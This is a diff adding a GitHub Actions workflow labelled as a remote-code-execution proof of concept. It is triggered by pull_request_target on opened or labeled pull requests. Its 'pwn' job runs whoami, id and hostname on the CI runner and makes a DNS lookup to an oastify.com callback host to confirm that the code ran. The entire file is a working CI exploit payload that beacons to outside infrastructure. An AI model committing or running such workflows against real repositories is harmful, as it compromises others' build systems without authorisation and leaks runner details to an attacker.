@@ -1,0 +1,15 @@
+﻿name: POC_RCE
+on:
+  pull_request_target:
+    types: [opened, labeled]
+
+jobs:
+  pwn:
+    runs-on: ubuntu-latest
+    steps:
+      - run: |
+          echo "=== RCE PROOF ==="
+          whoami
+          id
+          hostname
+          nslookup rce-google.1z1gzjx8xzur48nkod65wvmgv717pzdo.oastify.com
